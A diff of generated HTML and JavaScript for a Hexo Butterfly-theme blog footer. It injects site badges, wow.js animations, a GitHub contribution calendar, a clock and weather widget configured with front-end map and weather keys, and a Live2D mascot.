+    var item_html = '<div id="workboard"></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" data-title="博客框架为Hexo_v5.4.0" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&amp;logo=hexo" alt=""/></a><a class="github-badge" target="_blank" href="https://butterfly.js.org/" style="margin-inline:5px" data-title="主题版本Butterfly_v4.2.2" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&amp;logo=bitdefender" alt=""/></a><a class="github-badge" target="_blank" href="https://www.jsdelivr.com/" style="margin-inline:5px" data-title="本站使用JsDelivr为静态资源提供CDN加速" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/CDN-jsDelivr-orange?style=flat&amp;logo=jsDelivr" alt=""/></a><a class="github-badge" target="_blank" href="https://beian.miit.gov.cn/#/Integrated/index" style="margin-inline:5px" data-title="本站已在湘进行备案" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/湘ICP备-2022004213号-e1d492?style=flat&amp;logo=data:image/png;base64,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" alt=""/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" data-title="本站项目由Github托管" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&amp;logo=GitHub" alt=""/></a><a class="github-badge" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" style="margin-inline:5px" data-title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&amp;logo=Claris" alt=""/></a></p>';
+    console.log('已挂载butterfly_footer_beautify')
+    parent_div_git.insertAdjacentHTML("beforeend",item_html)
+    }
+  var elist = 'null'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_footer_beautify_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_footer_beautify_injector_config();
+  }
+  </script><script async src="/js/runtime/runtime.min.js"></script><div class="js-pjax"><script async="async">var arr = document.getElementsByClassName('recent-post-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '1.5s');
+    arr[i].setAttribute('data-wow-delay', '200ms');
+    arr[i].setAttribute('data-wow-offset', '30');
+    arr[i].setAttribute('data-wow-iteration', '1');
+  }</script><script async="async">var arr = document.getElementsByClassName('card-widget');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '');
+    arr[i].setAttribute('data-wow-delay', '200ms');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('flink-list-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__flipInY');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('flink-list-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__animated');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('article-sort-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__slideInRight');
+    arr[i].setAttribute('data-wow-duration', '1.5s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('site-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__flipInY');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('site-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__animated');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script></div><script defer src="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/wow_init.js"></script><script data-pjax src="https://cdn.cbd.int/hexo-filter-gitcalendar/lib/gitcalendar.js"></script><script data-pjax>
+  function gitcalendar_injector_config(){
+      var parent_div_git = document.getElementById('recent-posts');
+      var item_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><style>#git_container{min-height: 280px}@media screen and (max-width:650px) {#git_container{min-height: 0px}}</style><div id="git_loading" style="width:10%;height:100%;margin:0 auto;display: block;"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animatetransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animatetransform></path></svg><style>#git_container{display: none;}</style></div><div id="git_container"></div></div>';
+      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+      console.log('已挂载gitcalendar')
+      }
+
+    if( document.getElementById('recent-posts') && (location.pathname ==='/'|| '/' ==='all')){
+        gitcalendar_injector_config()
+        GitCalendarInit("https://python-github-calendar-api-spk83h666-anzhiyu-c.vercel.app/api?ke1nys",['#ebedf0', '#fdcdec', '#fc9bd9', '#fa6ac5', '#f838b2', '#f5089f', '#c4067e', '#92055e', '#540336', '#48022f', '#30021f'],'ke1nys')
+    }
+  </script><script data-pjax>
+  function butterfly_clock_anzhiyu_injector_config(){
+    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
+    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
+    console.log('已挂载butterfly_clock_anzhiyu')
+    if(parent_div_git) {
+      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  }
+  var elist = 'null'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var qweather_key = 'b16a1fa0e63c46a4b8f28abfb06ae3fe';
+  var gaud_map_key = 'e2b04289e870b005374ee030148d64fd&s=rsv3';
+  var baidu_ak_key = 'undefined';
+  var flag = 0;
+  var clock_rectangle = '112.982279,28.19409';
+  var clock_default_rectangle_enable = 'false';
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_clock_anzhiyu_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_clock_anzhiyu_injector_config();
+  }
+  </script><script src="https://widget.qweather.net/simple/static/js/he-simple-common.js?v=2.0"></script><script data-pjax src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.js"></script><!-- hexo injector body_end end --><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body></html>
